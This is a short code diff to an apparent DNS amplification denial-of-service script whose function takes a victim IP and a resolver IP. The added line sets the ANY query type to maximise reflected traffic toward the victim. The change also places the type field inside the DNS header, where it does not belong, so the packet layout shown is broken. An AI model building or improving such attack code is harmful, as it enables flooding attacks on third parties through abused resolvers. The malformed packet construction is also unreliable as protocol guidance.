@@ -22,6 +22,7 @@ def send_dns_amplification(victim_ip, resolver_ip, target_domain, query_type, ma
     dns_query = (
         b'\xaa\xbb'  # Transaction ID (random)
         b'\x01\x00'  # Standard query
+        b'\x00\xff'  # ANY Type
         b'\x00\x01'  # Questions: 1
         b'\x00\x00'  # Answer RRs
         b'\x00\x00'  # Authority RRs
